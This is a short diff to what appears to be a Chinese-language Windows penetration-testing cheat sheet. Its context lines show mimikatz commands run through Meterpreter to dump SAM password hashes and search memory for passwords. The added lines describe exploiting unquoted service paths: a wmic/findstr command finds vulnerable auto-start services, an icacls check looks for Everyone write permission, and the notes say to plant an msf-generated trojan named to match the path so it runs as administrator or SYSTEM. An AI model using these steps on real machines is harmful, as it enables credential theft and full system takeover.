@@ -17,3 +17,14 @@
     6.load mimikatz  mimikatz_command -f samdump::hashes
       mimikatz_command -f sekurlsa::searchPasswords
     
+    `无引号服务路径漏洞`
+    C:/windows/ysx soft/x.exe
+    C:/windows/ysx/x.exe
+    
+    查找命令
+    wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows\\" |findstr /i /v """
+    
+    icacls x.exe  是否为EveryOne权限
+    
+    如果是 则可以msf生成木马与存在漏洞的应用程序名称一致放在ysx目录下以管理员或系统权限启动这个应用
+    
